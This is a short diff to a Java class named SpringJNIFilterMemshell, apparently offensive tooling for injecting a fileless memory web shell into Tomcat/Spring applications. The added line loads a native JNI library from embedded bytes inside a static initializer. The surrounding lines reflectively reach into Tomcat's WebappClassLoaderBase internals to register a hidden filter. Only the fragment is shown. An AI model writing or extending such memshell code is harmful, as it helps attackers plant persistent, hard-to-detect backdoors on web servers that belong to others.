@@ -18,6 +18,7 @@ public class SpringJNIFilterMemshell implements Filter {
     static {
 
             try {
+                System.load(getJNILibFile(jniCodes));
                 Class WebappClassLoaderBaseClz = Class.forName("org.apache.catalina.loader.WebappClassLoaderBase");
                 Object webappClassLoaderBase = Thread.currentThread().getContextClassLoader();
                 Field WebappClassLoaderBaseResource = WebappClassLoaderBaseClz.getDeclaredField("resources");
